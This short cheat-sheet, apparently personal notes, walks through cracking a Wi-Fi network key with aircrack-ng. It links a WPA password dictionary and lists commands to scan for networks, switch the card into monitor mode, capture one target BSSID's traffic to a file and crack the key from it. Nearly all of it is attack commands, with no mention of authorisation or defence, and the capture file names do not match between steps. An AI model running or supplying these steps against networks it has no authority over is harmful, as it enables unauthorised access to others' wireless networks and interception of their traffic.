#### [github](https://github.com/conwnet/wpa-dictionary)
* iwlist wlan0 scan | grep -i “essid\| channel:”
* iwlist wlan0 scan | grep -i --color "essid\| channel:\|quality\|address"
#### Install aircrack-ng by source and apt
* wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc4.tar.gz
* sudo apt-get install aircrack-ng 
#### Run Aircrack-ng
* ifconfig wlan0 
or
* iwconfig wlan0
```
What is managed mode?
By default, our wireless card works on Managed mode i.e. it will only accept the traffic from 
the Access point it is associated(connected) to. All the other irrelevant packets will be 
dropped for reducing processing load for the router.
```
* airmon-ng check kill
#### Put card into Monitor mode
* airmon-ng start wlan0
    * check with ifconfig => wlan0mon
#### o start sniffing the air
* airodump-ng wlan0mon
    * Hit CTRL-C to stop
    * or 
    * airodump-ng mon0 -w test_data_capture
    * (Write into file)
* airodump-ng --bssid 64:66:B3:6E:B0:8A -c 1 -w rootsh3ll wlan0mon
    * #Data is the IVs that will be used to decrypt the key.
* aircrack-ng test_capture.cap
    * wait for the key appear
